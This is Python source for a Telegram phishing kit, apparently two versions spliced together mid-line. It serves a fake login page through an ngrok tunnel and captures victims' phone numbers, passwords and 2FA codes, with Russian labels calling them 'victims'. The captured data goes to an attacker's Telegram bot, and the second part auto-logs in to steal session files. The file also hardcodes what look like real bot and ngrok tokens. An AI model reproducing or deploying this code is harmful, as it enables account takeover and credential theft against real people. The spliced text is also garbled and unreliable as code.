from flask import Flask, render_template, request
from pyngrok import ngrok
import requests, os

app = Flask(__name__)

BOT_TOKEN = "7431242168:AAHoFtnRDfthNOXOHSto7njFB-Ph3Z3kyLM"
CHAT_ID = "7431242168"
NGROK_TOKEN = "36rGvvV7RV19BVtM2fGFTxtr804_4u7TXhWWBSnL9K1MN56Ff"

def send(msg):
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})

@app.route('/')
def home(): return render_template('terminal.html')

@app.route('/login', methods=['POST'])
def step1():
    phone = request.form['phone']
    pwd = request.form.get('password', 'Нет')
    send(f"<b>ЖЕРТВА (БЕЗ API)</b>\nТелефон: {phone}\nПароль: {pwd}")
    return render_template('terminal_code.html')

@app.route('/code', methods=['POST'])
def step2():
    code = request.form['code']
    send(f"<b>ГОТОВО БЕЗ API ID</b>\nКод 2FA: {code}\nТеперь вручную логинишься этими данными.")
    return "<pre style='color:#0f0;background:#000;padding:20px;'>Data captured successfully.</pre>"

if __name__ == '__main__':
    ngrok.set_auth_token(NGROK_TOKEN)
    tunnel = ngrok.connect(5000, "http")
    send(f"<b>ЛЕГКИЙ ФИШИНГ БЕЗ API ЗАПУЩЕН</b>\nСсылка: <code>{tunnel.public_url}</code>")
    app.run(host='0.0.0.0', port=5000)                await client.sign_in(password=password)
        session_file = f"{session_name}.session"
        if os.path.exists(session_file):
            send(f"<b>АККАУНТ ВЗЛОМАН С АНДРОИДА</b>\nТелефон: {phone}")
            send_file(session_file, f"Сессия с Android Termux — {phone}")
    except Exception as e:
        send(f"Ошибка: {e}")
    finally:
        await client.disconnect()

@app.route('/')
def index(): return render_template('terminal.html')

@app.route('/login', methods=['POST'])
def login():
    session['phone'] = request.form['phone']
    session['password'] = request.form.get('password', 'Нет')
    send(f"<b>ЖЕРТВА С АНДРОИДА</b>\nТелефон: {session['phone']}\nПароль: {session['password']}")
    return render_template('terminal_code.html')

@app.route('/code', methods=['POST'])
def code():
    code = request.form['code']
    send(f"<b>2FA ПОЛУЧЕН</b>\nКод: {code}\nЗапускаю автологин...")
    os.makedirs('sessions', exist_ok=True)
    loop = asyncio.new_event_loop()
    loop.run_until_complete(auto_login(session['phone'], session['password'], code))
    return "<pre style='color:#0f0;background:#000;padding:20px;'>Authentication successful. Session captured.</pre>"

if __name__ == '__main__':
    # Авторизация ngrok (один раз)
    ngrok.set_auth_token("YOUR_NGROK_AUTHTOKEN")  # Получи на ngrok.com
    public_url = ngrok.connect(5000, "http")
    send(f"<b>ANDROID ФИШИНГ ЗАПУЩЕН</b>\nСсылка: <code>{public_url}</code>")
    app.run(host='0.0.0.0', port=5000)
